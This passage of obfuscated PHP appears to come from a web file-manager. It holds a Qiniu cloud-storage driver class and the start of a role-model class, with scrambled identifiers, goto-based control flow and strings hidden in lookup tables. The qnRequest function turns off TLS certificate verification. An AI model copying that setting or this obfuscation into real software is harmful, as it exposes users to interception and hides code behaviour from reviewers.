$_SERVER[ì‹É][1177]; $this->_init($C¦Ó…ÄÖ); } public function _init($eÓÍË»¶ˆİ) { foreach ($eÓÍË»¶ˆİ as $AîâŠ¾Š” => $d‡²ƒ‰¼™Ç) { if (isset($this->{$AîâŠ¾Š”})) { $this->{$AîâŠ¾Š”} = $d‡²ƒ‰¼™Ç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ì‹É][1178], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EÈƒÍ‹’é, $B·ÛêæŠÈ = '', $cŒ£ÖºçÚ– = REPEAT_RENAME) { if ($this->setContent($EÈƒÍ‹’é, $B·ÛêæŠÈ)) { return $this->getPathOuter($EÈƒÍ‹’é); } return !1; } public function mkdir($b„«£¾ìê, $F§¦¿Òƒ¯§ = REPEAT_SKIP) { goto bÃ§‘â÷Û; bóöÇÀ¦©®: if (!$this->mkfile($d÷µˆ¹Ãä´)) { return !1; } if (!$this->moveFile($d÷µˆ¹Ãä´, $b„«£¾ìê)) { $this->delFile($d÷µˆ¹Ãä´); return !1; } return $this->getPathOuter($AêÇ–Ö¥Óé); goto cö¯©­; f©Šô›³½: $b„«£¾ìê = $AêÇ–Ö¥Óé . $FÃŠ¦Ë‹¯§[8]; $AÂÔ½ëïÔÚ = get_path_this($AêÇ–Ö¥Óé); $d÷µˆ¹Ãä´ = $b„«£¾ìê . $AÂÔ½ëïÔÚ; goto bóöÇÀ¦©®; bÃ§‘â÷Û: $FÃŠ¦Ë‹¯§ =& $_SERVER[ì‹É]; $AêÇ–Ö¥Óé = trim($b„«£¾ìê, $FÃŠ¦Ë‹¯§[8]); if ($this->_isFolder($AêÇ–Ö¥Óé)) { return $this->getPathOuter($AêÇ–Ö¥Óé); } goto f©Šô›³½; cö¯©­: } public function copyFile($Fá½ïë¡ó, $bê«„İœõ) { $B’‚’ööä½ = $this->bucketManager->copy($this->bucket, $Fá½ïë¡ó, $this->bucket, $bê«„İœõ, !0); return $B’‚’ööä½ ? !1 : !0; } public function moveFile($dŒÜêˆëÃ¿, $aßÓí÷•Ÿõ) { $e¼½ùí‡¦Ç = $this->bucketManager->move($this->bucket, $dŒÜêˆëÃ¿, $this->bucket, $aßÓí÷•Ÿõ, !0); return $e¼½ùí‡¦Ç ? !1 : !0; } public function delFile($A‚¡Š†…‡) { $Aøê®´‘™è = $this->bucketManager->delete($this->bucket, $A‚¡Š†…‡); return $Aøê®´‘™è ? !1 : !0; } public function delFolder($C¶‡ªàòŸ) { $CÏÙèô®ø = $this->fileList($C¶‡ªàòŸ); if (empty($CÏÙèô®ø)) { return !0; } $bŸïö°ÊÀ = 1000; if (count($CÏÙèô®ø) <= $bŸïö°ÊÀ) { return $this->qnDelObj($CÏÙèô®ø) ? !1 : !0; } foreach (array_chunk($CÏÙèô®ø, $bŸïö°ÊÀ) as $aÛØ˜íÑ‚) { $cÎø”ÍŒ = $this->qnDelObj($aÛØ˜íÑ‚); if ($cÎø”ÍŒ) { return !1; } } return !0; } private function qnDelObj($EÅ´×¬›à¬) { $F‘ï´ÏÜ´Ã = $this->bucketManager->buildBatchDelete($this->bucket, $EÅ´×¬›à¬); list($bìÍŸÊâã­, $FÄÈ„Êè´ó) = $this->bucketManager->batch($F‘ï´ÏÜ´Ã); return $FÄÈ„Êè´ó; } private function fileList($fŞ¾ŒÎöÜ, $a©Ê»©Ÿ¶ = 0) { goto c›¶ãÖŠÑĞ; c›¶ãÖŠÑĞ: $FãÏÏ¤‰‚ñ =& $_SERVER[ì‹É]; $fŞ¾ŒÎöÜ = trim($fŞ¾ŒÎöÜ, $FãÏÏ¤‰‚ñ[8]); $Bİ…æéƒ¹Í = empty($fŞ¾ŒÎöÜ) ? $FãÏÏ¤‰‚ñ[33] : $fŞ¾ŒÎöÜ . $FãÏÏ¤‰‚ñ[8]; goto cğ¯‹¥ìùÎ; cğ¯‹¥ìùÎ: $AêØÈÔâãš = $FãÏÏ¤‰‚ñ[33]; $eÇÎ÷¾Ü”á = 1000; $DˆÒø”å„¹ = $FãÏÏ¤‰‚ñ[33]; goto dé‹¦£„; dé‹¦£„: $c—’ˆ¥çêİ = array(); while (!0) { list($câà÷¡šˆâ, $B­„¢Ïå®Ì) = $this->bucketManager->listFiles($this->bucket, $Bİ…æéƒ¹Í, $AêØÈÔâãš, $eÇÎ÷¾Ü”á, $DˆÒø”å„¹); if ($B­„¢Ïå®Ì) { return !1; } $AêØÈÔâãš = array_key_exists($FãÏÏ¤‰‚ñ[1148], $câà÷¡šˆâ) ? $AêØÈÔâãš = $câà÷¡šˆâ[$FãÏÏ¤‰‚ñ[1179]] : $FãÏÏ¤‰‚ñ[33]; foreach ($câà÷¡šˆâ[$FãÏÏ¤‰‚ñ[1180]] as $DÄ‹àˆ‡œ) { $F©©—‰à¶ö = $DÄ‹àˆ‡œ[$FãÏÏ¤‰‚ñ[90]]; if ($a©Ê»©Ÿ¶) { $F©©—‰à¶ö = array($FãÏÏ¤‰‚ñ[28] => $F©©—‰à¶ö, $FãÏÏ¤‰‚ñ[78] => $DÄ‹àˆ‡œ[$FãÏÏ¤‰‚ñ[1181]]); } $c—’ˆ¥çêİ[] = $F©©—‰à¶ö; } if ($AêØÈÔâãš == $FãÏÏ¤‰‚ñ[33]) { break; } } return $c—’ˆ¥çêİ; goto b´ïï¢í¡; b´ïï¢í¡: } public function rename($cäò³°ËÃñ, $aâ¤½âÚ•) { return $this->renameObject($cäò³°ËÃñ, $aâ¤½âÚ•); } public function fileInfo($c„ÅÁ‚µè½, $c°Ûë¼¶ = false, $D§ËÀµªß§ = array()) { goto E¨ÜÕ÷ˆ; c¹â˜¯ˆã¥: return $E ¬ëØóå©; goto d•‡†…ÏÒ–; eİëÂÌÌ¾: if (empty($D§ËÀµªß§)) { $D§ËÀµªß§ = $this->objectMeta($c„ÅÁ‚µè½); if (!$D§ËÀµªß§) { return $E ¬ëØóå©; } } if (isset($D§ËÀµªß§[$Fƒ Ø ¼Ö–[1182]])) { $E ¬ëØóå©[$Fƒ Ø ¼Ö–[184]] = $D§ËÀµªß§[$Fƒ Ø ¼Ö–[1182]]; } if (isset($D§ËÀµªß§[$Fƒ Ø ¼Ö–[1181]])) { $E ¬ëØóå©[$Fƒ Ø ¼Ö–[78]] = $D§ËÀµªß§[$Fƒ Ø ¼Ö–[1181]]; } goto c¹â˜¯ˆã¥; E¨ÜÕ÷ˆ: $Fƒ Ø ¼Ö– =& $_SERVER[ì‹É]; if ($c°Ûë¼¶) { return array($Fƒ Ø ¼Ö–[28] => $this->pathThis($c„ÅÁ‚µè½), $Fƒ Ø ¼Ö–[76] => $this->getPathOuter($Fƒ Ø ¼Ö–[8] . $c„ÅÁ‚µè½), $Fƒ Ø ¼Ö–[29] => $Fƒ Ø ¼Ö–[164], $Fƒ Ø ¼Ö–[78] => isset($D§ËÀµªß§[$Fƒ Ø ¼Ö–[1181]]) ? $D§ËÀµªß§[$Fƒ Ø ¼Ö–[1181]] : 0, $Fƒ Ø ¼Ö–[157] => $this->ext($c„ÅÁ‚µè½)); } $E ¬ëØóå© = array($Fƒ Ø ¼Ö–[28] => $this->pathThis($c„ÅÁ‚µè½), $Fƒ Ø ¼Ö–[76] => $this->getPathOuter($Fƒ Ø ¼Ö–[8] . $c„ÅÁ‚µè½), $Fƒ Ø ¼Ö–[29] => $Fƒ Ø ¼Ö–[164], $Fƒ Ø ¼Ö–[184] => $Fƒ Ø ¼Ö–[50], $Fƒ Ø ¼Ö–[108] => $Fƒ Ø ¼Ö–[50], $Fƒ Ø ¼Ö–[78] => 0, $Fƒ Ø ¼Ö–[157] => $this->ext($c„ÅÁ‚µè½), $Fƒ Ø ¼Ö–[185] => !0, $Fƒ Ø ¼Ö–[186] => !0); goto eİëÂÌÌ¾; d•‡†…ÏÒ–: } public function folderInfo($CŠ¦ó‰Ñœø, $bˆ‘ã¾Âë = false) { $D™·Š¦óõ =& $_SERVER[ì‹É]; if ($bˆ‘ã¾Âë) { return array($D™·Š¦óõ[28] => $this->pathThis($CŠ¦ó‰Ñœø), $D™·Š¦óõ[76] => $this->getPathOuter($D™·Š¦óõ[8] . $CŠ¦ó‰Ñœø), $D™·Š¦óõ[29] => $D™·Š¦óõ[77]); } $fìË±÷Éñ = array($D™·Š¦óõ[28] => $this->pathThis($CŠ¦ó‰Ñœø), $D™·Š¦óõ[76] => $this->getPathOuter($D™·Š¦óõ[8] . $CŠ¦ó‰Ñœø), $D™·Š¦óõ[29] => $D™·Š¦óõ[77], $D™·Š¦óõ[184] => $D™·Š¦óõ[50], $D™·Š¦óõ[108] => $D™·Š¦óõ[50], $D™·Š¦óõ[1126] => !0, $D™·Š¦óõ[1127] => !0); if (empty($C˜ã³ç©©¯)) { $CŠ¦ó‰Ñœø = rtrim($CŠ¦ó‰Ñœø, $D™·Š¦óõ[8]) . $D™·Š¦óõ[8]; $C¥­Šòˆø = $this->objectMeta($CŠ¦ó‰Ñœø); if (!$C¥­Šòˆø) { return $fìË±÷Éñ; } } if (isset($C˜ã³ç©©¯[$D™·Š¦óõ[1182]])) { $fìË±÷Éñ[$D™·Š¦óõ[184]] = $C˜ã³ç©©¯[$D™·Š¦óõ[1182]]; } return $fìË±÷Éñ; } public function listPath($fĞÖ«¦ŠÅ®, $C»¡Ë…èœÌ = false) { goto DÕˆ¢ÍØ¥; cÚ†ùÍé‰”: $fôŠ¿Äªí¨ = $Dì®µÂå‹ï[33]; $cšÍÍ„‰ñ– = 1000; $E¯òÀïÔµì = $Dì®µÂå‹ï[8]; goto CÕõã‹Ÿ¥; DÕˆ¢ÍØ¥: $Dì®µÂå‹ï =& $_SERVER[ì‹É]; $fĞÖ«¦ŠÅ® = trim($fĞÖ«¦ŠÅ®, $Dì®µÂå‹ï[8]); $dœÆæ“±Æ = empty($fĞÖ«¦ŠÅ®) ? $Dì®µÂå‹ï[33] : $fĞÖ«¦ŠÅ® . $Dì®µÂå‹ï[8]; goto cÚ†ùÍé‰”; CÕõã‹Ÿ¥: $a‘¼³ìì„÷ = $c½¶Ô¨ÚèÍ = array(); while (!0) { list($dÏ“Å˜Üº, $Dİ¦ô†ôğ) = $this->bucketManager->listFiles($this->bucket, $dœÆæ“±Æ, $fôŠ¿Äªí¨, $cšÍÍ„‰ñ–, $E¯òÀïÔµì); if ($Dİ¦ô†ôğ) { return !1; } $fôŠ¿Äªí¨ = array_key_exists($Dì®µÂå‹ï[1148], $dÏ“Å˜Üº) ? $fôŠ¿Äªí¨ = $dÏ“Å˜Üº[$Dì®µÂå‹ï[1179]] : $Dì®µÂå‹ï[33]; if (isset($dÏ“Å˜Üº[$Dì®µÂå‹ï[1183]])) { foreach ($dÏ“Å˜Üº[$Dì®µÂå‹ï[1183]] as $B¨ÈŞ¤ÔÏê) { if ($B¨ÈŞ¤ÔÏê == $dœÆæ“±Æ) { continue; } $a‘¼³ìì„÷[] = $this->folderInfo($B¨ÈŞ¤ÔÏê, $C»¡Ë…èœÌ); } } if (isset($dÏ“Å˜Üº[$Dì®µÂå‹ï[1180]])) { foreach ($dÏ“Å˜Üº[$Dì®µÂå‹ï[1180]] as $e—«„öˆšá) { if ($e—«„öˆšá[$Dì®µÂå‹ï[90]] == $dœÆæ“±Æ) { continue; } $c½¶Ô¨ÚèÍ[] = $this->fileInfo($e—«„öˆšá[$Dì®µÂå‹ï[90]], $C»¡Ë…èœÌ, $e—«„öˆšá); } } if ($fôŠ¿Äªí¨ == $Dì®µÂå‹ï[33]) { break; } } return array($Dì®µÂå‹ï[75] => $a‘¼³ìì„÷, $Dì®µÂå‹ï[74] => $c½¶Ô¨ÚèÍ); goto e¬…´Áä”Ó; e¬…´Áä”Ó: } public function has($DÌğà°‘Á, $EæÔéŒ¶¤ = false, $DâêÈËâ‚ = true) { goto FÁ£°àñ÷É; b¹Ÿ¶¡ì™: $aè›ß‘–”‘ = $FâàÏ¬ËØé[33]; $F×ÛÅ¿½ŠÂ = 1000; $EÏÍµƒ³ï„ = $FâàÏ¬ËØé[8]; goto bøµÅÇ¢šù; dº†…öËØ: if ($EæÔéŒ¶¤) { return array($FâàÏ¬ËØé[188] => $c™ã‹·­, $FâàÏ¬ËØé[189] => $C®‚ÆÀÀÙ‡); } return !1; goto EË—í­ğÚÚ; bøµÅÇ¢šù: $c™ã‹·­ = 0; $C®‚ÆÀÀÙ‡ = 0; while (!0) { list($DåêÇë¥˜©, $eÊ  ¸‘) = $this->bucketManager->listFiles($this->bucket, $fñöµ—×ˆ, $aè›ß‘–”‘, $F×ÛÅ¿½ŠÂ, $EÏÍµƒ³ï„); if ($eÊ  ¸‘) { return !1; } $aè›ß‘–”‘ = array_key_exists($FâàÏ¬ËØé[1148], $DåêÇë¥˜©) ? $aè›ß‘–”‘ = $DåêÇë¥˜©[$FâàÏ¬ËØé[1179]] : $FâàÏ¬ËØé[33]; if ($EæÔéŒ¶¤) { if (!empty($DåêÇë¥˜©[$FâàÏ¬ËØé[1180]])) { $c™ã‹·­ += count($DåêÇë¥˜©[$FâàÏ¬ËØé[1180]]); } if (!empty($DåêÇë¥˜©[$FâàÏ¬ËØé[1183]])) { $C®‚ÆÀÀÙ‡ += count($DåêÇë¥˜©[$FâàÏ¬ËØé[1183]]); } if ($aè›ß‘–”‘ === $FâàÏ¬ËØé[33]) { break; } continue; } if ($DâêÈËâ‚) { if (!empty($DåêÇë¥˜©[$FâàÏ¬ËØé[1180]])) { return !0; } } else { if (!empty($DåêÇë¥˜©[$FâàÏ¬ËØé[1183]])) { return !0; } } if ($aè›ß‘–”‘ == $FâàÏ¬ËØé[33]) { break; } } goto dº†…öËØ; FÁ£°àñ÷É: $FâàÏ¬ËØé =& $_SERVER[ì‹É]; $DÌğà°‘Á = trim($DÌğà°‘Á, $FâàÏ¬ËØé[8]); $fñöµ—×ˆ = empty($DÌğà°‘Á) ? $FâàÏ¬ËØé[33] : $DÌğà°‘Á . $FâàÏ¬ËØé[8]; goto b¹Ÿ¶¡ì™; EË—í­ğÚÚ: } public function listAll($CŞ•ÕŒà„²) { $d¡…·âïõ =& $_SERVER[ì‹É]; $aôÇ×¿Óİ = $this->fileList($CŞ•ÕŒà„², 1); $e¸¥°Š Ï¨ = array(); foreach ($aôÇ×¿Óİ as $cÍŠî˜¯¢‰) { $e¸¥°Š Ï¨[$cÍŠî˜¯¢‰[$d¡…·âïõ[28]]] = $cÍŠî˜¯¢‰[$d¡…·âïõ[78]]; } return $this->listAllFiles($CŞ•ÕŒà„², array_keys($e¸¥°Š Ï¨), $e¸¥°Š Ï¨); } public function canRead($eõ®‡Ë”à) { return $this->exist($eõ®‡Ë”à) ? !0 : !1; } public function canWrite($AÑ³“Šº½¾) { return $this->exist($AÑ³“Šº½¾) ? !0 : !1; } public function getContent($DƒÁèåÚ¡æ) { return $this->fileSubstr($DƒÁèåÚ¡æ, 0, -1); } public function setContent($AóŒ‚¼Ğ, $D¬µƒ‘Õá = '') { $D‰¾³µáš = $this->tempFile($this->pathThis($AóŒ‚¼Ğ)); file_put_contents($D‰¾³µáš, $D¬µƒ‘Õá); if ($this->upload($AóŒ‚¼Ğ, $D‰¾³µáš)) { $this->tempFileRemve($D‰¾³µáš); return !0; } return !1; } public function refreshUrls($d¿ÚÛ±‰Á) { goto eË©¦îãèì; cë“¸ù—ŒÒ: return $A–á†•ŒÍ“[$c†Î…·¹Ö¸[1184]] == $c†Î…·¹Ö¸[683] ? !0 : !1; goto fƒ’Îè²¾; FİÀáÎ¤‡: $eÕ¤„—µ = new Qiniu\Cdn\CdnManager($this->auth); list($A–á†•ŒÍ“, $bê¦ïàöÉÙ) = $eÕ¤„—µ->refreshUrls($DÕ—šÛÇ›ï); if ($bê¦ïàöÉÙ) { return !1; } goto cë“¸ù—ŒÒ; eË©¦îãèì: $c†Î…·¹Ö¸ =& $_SERVER[ì‹É]; $DÕ—šÛÇ›ï = array(); if (is_array($d¿ÚÛ±‰Á)) { foreach ($d¿ÚÛ±‰Á as $F½öÑ¸—µ) { $DÕ—šÛÇ›ï[] = $this->link($F½öÑ¸—µ); } } else { $DÕ—šÛÇ›ï[] = $this->link($d¿ÚÛ±‰Á); } goto FİÀáÎ¤‡; fƒ’Îè²¾: } public function fileSubstr($e“ÄŒË–šÄ, $A±Ôé‰æé², $AÀé·Ô·İ‰) { $eĞŒ¥ñÕ£ =& $_SERVER[ì‹É]; if (!($BğÁ›º¿å = $this->link($e“ÄŒË–šÄ))) { return !1; } $D­Å—ãí‘ = array($eĞŒ¥ñÕ£[1151] => $A±Ôé‰æé², $eĞŒ¥ñÕ£[322] => $AÀé·Ô·İ‰); return $this->qnRequest($BğÁ›º¿å, $D­Å—ãí‘); } public function upload($C‰§Ä•ä, $Bù…£Û¿„•, $EóÀ‚®íĞ = false, $b°ÕôæÍÎ = REPEAT_REPLACE) { $E“Ï¾ÇÏÅ = new Qiniu\Storage\UploadManager(); $EñáğÎ¸åÙ = $this->auth->uploadToken($this->bucket, $C‰§Ä•ä); $C½¦ŠİéÛ = get_file_mime(get_path_ext($Bù…£Û¿„•)); list($F‹”Ëï±’‚, $C‰ «æ…Åª) = $E“Ï¾ÇÏÅ->putFile($EñáğÎ¸åÙ, $C‰§Ä•ä, $Bù…£Û¿„•, null, $C½¦ŠİéÛ); return $C‰ «æ…Åª ? !1 : $this->getPathOuter($C‰§Ä•ä); } public function uploadFormData($EêŠ“¬ØÎ, $aæêšçõô‹ = 3600) { return $this->uploadToken($EêŠ“¬ØÎ, $aæêšçõô‹); } public function multiUploadFormData($Föñ¼Œ²Ö, $dËÅÊ•ÊÓ‚ = 3600) { return $this->uploadToken($Föñ¼Œ²Ö, $dËÅÊ•ÊÓ‚); } private function uploadToken($eİ’¡é›, $fë¶«ã´¢É = 3600) { goto Câ­åÕ”•ˆ; EÜ—¹ĞÛ“à: $E¿¢÷Ï¯§´ = null; $CÂìÅî“¹ô = $this->auth->uploadToken($this->bucket, $E¿¢÷Ï¯§´, $C„¯Æºæªİ, $b¥­¦æÊÛ¡, !0); $fË¢‚‚‹ = empty($this->region) || $this->region == $aÚ¡õÙ§‰µ[1187] ? $aÚ¡õÙ§‰µ[33] : $aÚ¡õÙ§‰µ[408] . $this->region; goto Bö½ƒÀ’ô; Bö½ƒÀ’ô: $a´³Ãéà‰† = http_type() . "\72\x2f\57\x75\160\154\x6f\x61\144{$fË¢‚‚‹}\x2e\161\151\x6e\x69\165\x70\56\143\x6f\155\x2f"; return array($aÚ¡õÙ§‰µ[1188] => $CÂìÅî“¹ô, $aÚ¡õÙ§‰µ[1189] => $a´³Ãéà‰†); goto B»ö¥­‡‘¡; Câ­åÕ”•ˆ: $aÚ¡õÙ§‰µ =& $_SERVER[ì‹É]; $C„¯Æºæªİ = $fë¶«ã´¢É; $b¥­¦æÊÛ¡ = array($aÚ¡õÙ§‰µ[1185] => $aÚ¡õÙ§‰µ[1186]); goto EÜ—¹ĞÛ“à; B»ö¥­‡‘¡: } public function download($CÇœŠ±, $A†õ£İŠ‚Õ) { goto dŒÆ¡™ßô—; dŒÆ¡™ßô—: $e¦©Áƒ›µ =& $_SERVER[ì‹É]; $aŸéäé¶îò = IO::getPathInner(IO::mkfile($A†õ£İŠ‚Õ)); if (!($C×¤èªˆ¯Ÿ = $this->link($CÇœŠ±))) { return !1; } goto aÀî§˜øÙ£; CÕ…‘Ïàî­: while (!0) { $e¸½¿½µ¿ = array($e¦©Áƒ›µ[1151] => $D…²Ôõ„Ü, $e¦©Áƒ›µ[322] => $E‚´òÇÆ…š); $D¾²ÏÙÂö¬ = $this->qnRequest($C×¤èªˆ¯Ÿ, $e¸½¿½µ¿); if ($D…²Ôõ„Ü && ($C£¡å‡Ñå = @json_decode($D¾²ÏÙÂö¬, !0))) { if (isset($C£¡å‡Ñå[$e¦©Áƒ›µ[1184]])) { return !1; } } fwrite($b™©Ñ†¾ ¶, $D¾²ÏÙÂö¬); $D…²Ôõ„Ü += $E‚´òÇÆ…š; if (strlen($D¾²ÏÙÂö¬) < $E‚´òÇÆ…š) { break; } } fclose($b™©Ñ†¾ ¶); return $A†õ£İŠ‚Õ; goto d¹Š†‚ˆÎØ; aÀî§˜øÙ£: $D…²Ôõ„Ü = 0; $E‚´òÇÆ…š = 1024 * 200; $b™©Ñ†¾ ¶ = fopen($aŸéäé¶îò, $e¦©Áƒ›µ[1190]); goto CÕ…‘Ïàî­; d¹Š†‚ˆÎØ: } public function link($A¸÷–›Ó¤, $aâ¾“Ñ¸Ä = '') { if (!$this->isFile($A¸÷–›Ó¤)) { return !1; } $e†šÈÛØ¡ = $this->getHost() . $_SERVER[ì‹É][8] . $this->pathEncode($A¸÷–›Ó¤) . $aâ¾“Ñ¸Ä; return $this->auth->privateDownloadUrl($e†šÈÛØ¡, 3600 * 12); } public function fileOut($B¥Íßáì½§, $dƒ¨®ŸÑ’Ì = false, $e¿³ÎØ”Î¸ = false, $AŠÈ»ÉÉãì = '') { $b®‘ã¹ó§ =& $_SERVER[ì‹É]; if (!$e¿³ÎØ”Î¸) { $e¿³ÎØ”Î¸ = $this->pathThis($B¥Íßáì½§); } $aÎÜä²ÒÍî = $dƒ¨®ŸÑ’Ì ? $b®‘ã¹ó§[1191] . rawurlencode($e¿³ÎØ”Î¸) : $b®‘ã¹ó§[33]; $Aé’‘ŠØ˜ù = $this->link($B¥Íßáì½§, $aÎÜä²ÒÍî); $this->fileOutLink($Aé’‘ŠØ˜ù); } public function fileOutServer($cÕö‘ÌÄŒ, $fø¬”¼×ã¿ = false, $EĞÊñÓ¤İĞ = false, $E„¯è©äÃº = '') { parent::fileOut($cÕö‘ÌÄŒ, $fø¬”¼×ã¿, $EĞÊñÓ¤İĞ, $E„¯è©äÃº); } public function fileOutImage($E’¢¤—¶ìÁ, $CÂÍÃğõö = 250) { $cøØÅŒÜ„Å = $this->link($E’¢¤—¶ìÁ, $_SERVER[ì‹É][1192] . $CÂÍÃğõö); $this->fileOutLink($cøØÅŒÜ„Å); } public function fileOutImageServer($e¯Š‰©¼®õ, $Dº÷¥‡öíµ = 250) { parent::fileOutImage($e¯Š‰©¼®õ, $Dº÷¥‡öíµ); } public function hashMd5($c“îæîÃø) { $E¯Š™‹Ë„ =& $_SERVER[ì‹É]; $F”æÉ¨‚å = $this->objectMeta($c“îæîÃø); if (isset($F”æÉ¨‚å[$E¯Š™‹Ë„[193]])) { return $F”æÉ¨‚å[$E¯Š™‹Ë„[193]]; } $DîÅŞŒ¶ = $this->link($c“îæîÃø, $E¯Š™‹Ë„[1193]); $F­°ëîåÆ = $this->qnRequest($DîÅŞŒ¶, array(), !0); return !isset($F­°ëîåÆ[$E¯Š™‹Ë„[194]]) ? !1 : $F­°ëîåÆ[$E¯Š™‹Ë„[194]]; } public function qnRequest($bÁÃ²Œƒ·, $FàŠˆË„ù¾ = array(), $d²‡”äğîô = false) { goto dî¶†Ç°‚; FÀˆÆé˜ƒ: curl_setopt($Bé¹–á…ß…, CURLOPT_PROGRESSFUNCTION, $E×‚Ó´Ÿ±ù[1194]); curl_progress_start($Bé¹–á…ß…); if (isset($FàŠˆË„ù¾[$E×‚Ó´Ÿ±ù[1151]]) && $FàŠˆË„ù¾[$E×‚Ó´Ÿ±ù[322]] > 0) { $Cƒ…éİ–Å = $FàŠˆË„ù¾[$E×‚Ó´Ÿ±ù[1151]]; $Aö´ò¢±Ó = $FàŠˆË„ù¾[$E×‚Ó´Ÿ±ù[1151]] + ($FàŠˆË„ù¾[$E×‚Ó´Ÿ±ù[322]] - 1); curl_setopt($Bé¹–á…ß…, CURLOPT_RANGE, "{$Cƒ…éİ–Å}\x2d{$Aö´ò¢±Ó}"); } goto cÓ¤æ„¤ó; fã´„’Ú•…: curl_close($Bé¹–á…ß…); if ($d²‡”äğîô) { return @json_decode($AÃ†É‹–¸, !0); } return $AÃ†É‹–¸; goto BÜ…”ÇÓ÷; cÓ¤æ„¤ó: curl_setopt($Bé¹–á…ß…, CURLOPT_FOLLOWLOCATION, 1); $AÃ†É‹–¸ = curl_exec($Bé¹–á…ß…); curl_progress_end($Bé¹–á…ß…); goto fã´„’Ú•…; a–±ë¹Â¼â: curl_setopt($Bé¹–á…ß…, CURLOPT_RETURNTRANSFER, 1); curl_setopt($Bé¹–á…ß…, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($Bé¹–á…ß…, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto AÍèì­‘§Œ; dî¶†Ç°‚: $E×‚Ó´Ÿ±ù =& $_SERVER[ì‹É]; $Bé¹–á…ß… = curl_init(); curl_setopt($Bé¹–á…ß…, CURLOPT_URL, $bÁÃ²Œƒ·); goto a–±ë¹Â¼â; AÍèì­‘§Œ: curl_setopt($Bé¹–á…ß…, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Bé¹–á…ß…, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($Bé¹–á…ß…, CURLOPT_NOPROGRESS, !1); goto FÀˆÆé˜ƒ; BÜ…”ÇÓ÷: } public function size($a ‡´Ğ‹İĞ) { $d¾ÊÛíê§ö = $this->objectMeta($a ‡´Ğ‹İĞ); return $d¾ÊÛíê§ö ? $d¾ÊÛíê§ö[$_SERVER[ì‹É][78]] : 0; } public function info($e¹Šô’³£) { if ($this->isFolder($e¹Šô’³£)) { return $this->folderInfo($e¹Šô’³£); } else { if ($this->isFile($e¹Šô’³£)) { return $this->fileInfo($e¹Šô’³£); } } return !1; } public function exist($EÓˆç¶·) { return $this->isFile($EÓˆç¶·) || $this->isFolder($EÓˆç¶·); } public function isFile($CÇ×«ôäÑ) { return !$this->isFolder($CÇ×«ôäÑ) && $this->objectMeta($CÇ×«ôäÑ); } public function isFolder($f×‡¡Ø†Œ¼) { return $this->cacheMethod($_SERVER[ì‹É][220], $f×‡¡Ø†Œ¼); } protected function objectMeta($D¿º°ƒ‹æ) { return $this->cacheMethod($_SERVER[ì‹É][221], $D¿º°ƒ‹æ); } protected function _objectMeta($bä«Ü±‚) { $c”‰ ëÛ· =& $_SERVER[ì‹É]; list($f¡ÄˆÚ¤õ, $cîë‘ô¦Óù) = $this->bucketManager->stat($this->bucket, $bä«Ü±‚); if ($f¡ÄˆÚ¤õ) { $f¡ÄˆÚ¤õ[$c”‰ ëÛ·[78]] = intval($f¡ÄˆÚ¤õ[$c”‰ ëÛ·[1181]]); } return $f¡ÄˆÚ¤õ; } protected function _isFolder($bÊÌ¹«ÀèØ) { $d¬ç×½Ù½ô =& $_SERVER[ì‹É]; list($eÌ¡¤Ê¢á¦, $aÇÑÄÓä³) = $this->bucketManager->listFiles($this->bucket, trim($bÊÌ¹«ÀèØ, $d¬ç×½Ù½ô[8]) . $d¬ç×½Ù½ô[8], $d¬ç×½Ù½ô[33], 1, $d¬ç×½Ù½ô[8]); return !empty($eÌ¡¤Ê¢á¦[$d¬ç×½Ù½ô[1180]]) || !empty($eÌ¡¤Ê¢á¦[$d¬ç×½Ù½ô[1183]]) ? !0 : !1; } } goto AİçÈâø±ö; fÅÂÁĞŒ»ù: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\162\x6f\x6c\145\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\164\x68", "\x6c\141\142\x65\x6c", "\144\151\163\160\x6c\141\x79", "\x73\x79\163\x74\x65\155", "\x64\x65\x73\143", "\x69\147\x6e\x6f\x72\x65\x45\x78\164", "\151\147\x6e\157\162\145\x46\x69\154\x65\123\151\172\145", "\141\144\155\x69\x6e\151\163\164\x72\141\164\x6f\x72", "\163\157\162\x74"); public function listData($B¸ùÅ¦›Ùˆ = false, $Cœ³³™×À² = "\163\x6f\162\x74", $b îõÅºŠˆ = false) { return parent::listData($B¸ùÅ¦›Ùˆ, $Cœ³³™×À², $b îõÅºŠˆ); } public function update($fù÷ÛÓ’‡, $Aà«±Ò…´) { goto Dâ½¹¹Ğ; dÂù×¦Ä×‰: return parent::update($fù÷ÛÓ’‡, $Aà«±Ò…´); goto CÉùÏ¾”‹œ; Dâ½¹¹Ğ: $A¾¥³ÏïÄ² =& $_SERVER[ì‹É]; $cÉ’õÀï©¡ = parent::listData($fù÷ÛÓ’‡); $BÁ…³ó”‡ = $this->findByName($Aà«±Ò…´[$A¾¥³ÏïÄ²[28]]); goto Fï¤î…ì‡º; Fï¤î…ì‡º: if (!$cÉ’õÀï©¡ || $BÁ…³ó”‡ && $BÁ…³ó”‡[$A¾¥³ÏïÄ²[364]] != $cÉ’õÀï©¡[$A¾¥³ÏïÄ²[364]]) { return !1; } if ($BÁ…³ó”‡[$A¾¥³ÏïÄ²[2364]] == 1) { $Aà«±Ò…´ = array($A¾¥³ÏïÄ²[28] => $Aà«±Ò…´[$A¾¥³ÏïÄ²[28]], $A¾¥³ÏïÄ²[2032] => $Aà«±Ò…´[$A¾¥³ÏïÄ²[2032]]); } $this->filterAuth($Aà«±Ò…´[$A¾¥³ÏïÄ²[373]]); goto dÂù×¦Ä×‰; CÉùÏ¾”‹œ: } public function remove($béİ÷ë†˜Ğ) { $AïÁ¸ï½„œ = parent::listData($béİ÷ë†˜Ğ); if (!$AïÁ¸ï½„œ || $AïÁ¸ï½„œ[$_SERVER[ì‹É][1053]]) { return !1; } return parent::remove($béİ÷ë†˜Ğ); } public function add($EˆÓàøÎ¥) { goto a²Ë›ä·èÌ; a„Ã°æªßØ: $bàå…ƒ®¨ = array($bŒ¹°‹îÖ[383] => 